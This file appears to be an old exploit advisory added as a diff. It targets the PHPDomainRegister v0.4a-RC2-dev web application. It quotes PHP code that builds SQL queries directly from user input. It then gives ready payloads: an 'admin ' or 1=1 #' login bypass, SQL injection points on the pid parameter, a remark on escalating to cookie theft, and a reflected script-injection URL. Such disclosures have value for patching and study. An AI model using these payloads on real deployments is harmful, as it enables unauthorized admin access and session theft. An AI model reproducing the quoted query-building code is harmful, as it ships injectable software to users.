@@ -1,0 +1,68 @@
+Title    = PHPDomainRegister v0.4a-RC2-dev => [SQL Auth][SQL Inject][XSS]
+Author   = Or4nG.M4n
+Download = http://garr.dl.sourceforge.net/project/phpdr/v0.4b%20-%20RC2.rar
+
+This Bug Powered By : GooGLe
+Thnks :
++----------------------------------+
+|   xSs m4n i-Hmx Cyber-Crystal    |
+|   Dr.Bnned ahwak2000 sa^Dev!L    |
++----------------------------------+
+
+                                       SQL Auth Bypass
+vuln : class_AjaxLogin.php line 73
+
+  function is_login() { <<<<==== 1
+        include ('../config.php'); <<<<==== 2
+  if(isset($_POST['username']))  { <<<<==== 3
+  $_SESSION['username']   = $_POST['username']; <<<<==== 4
+		 $password   = $_POST['password']; <<<<==== 5
+		 $strSQL     = <<<<==== 6
+                     "SELECT 
+                                *
+                        FROM
+                                `".$_SQL_PREFIX . $USER_Table_Name."`
+				        WHERE
+				                `LOGIN_NAME` = '".$_SESSION['username']."'
+				        AND
+				                password = md5('".$password."');"; <<<<==== 7
+
+            $result  = mysql_query ($strSQL); <<<<==== 8
+			$row     = mysql_fetch_row($result); <<<<==== 9
+		    $exist   = count($row); <<<<==== 10
+		if($exist >=2) { $this->jscript_location();  } <<<<==== 11
+		
+		[jscript_location]
+		
+		  function jscript_location() { <<<<==== 12
+            $this->set_session(); <<<<==== 13
+        echo "<script> $('#container').fadeOut();window.location.href='".SUCCESS_LOGIN_GOTO."'</script>"; <<<<==== 14
+  
+
+How i can Exploit this bug : 
+just login as = > admin ' or 1=1 #
+
+                                      SQL injection
+vuln
+admin/index.php line 212
+
+$sql = "SELECT name, price, disc, disc2, webspace FROM ".$_SQL_PREFIX."packages WHERE `id` = ".$_GET['pid'].";"; <<<<==== 1
+$getpack = mysql_query($sql); <<<<==== 2
+
+line 1079
+
+        showPacket($pid); <<<<==== 3
+								  
+vuln
+index.php line 617
+ 
+    $SQL = "SELECT * FROM ".$_SQL_PREFIX."packages where id = ".$_GET['pid'].""; <<<<==== 1
+    $result = mysql_query($SQL); <<<<==== 2
+
+Exploit Here :
+index.php?usetype=domainauswahl&pid=%injectionhere%&use=Details
+admin/index.php?show=showPacket&pid=%injectionhere% Sql to xss to get cookie
+
+
+	                                 Cross Site Scrpting [xss]
+admin/index.php?show=domains&do=delFirmadomains&domain=<script>alert(7);</script>
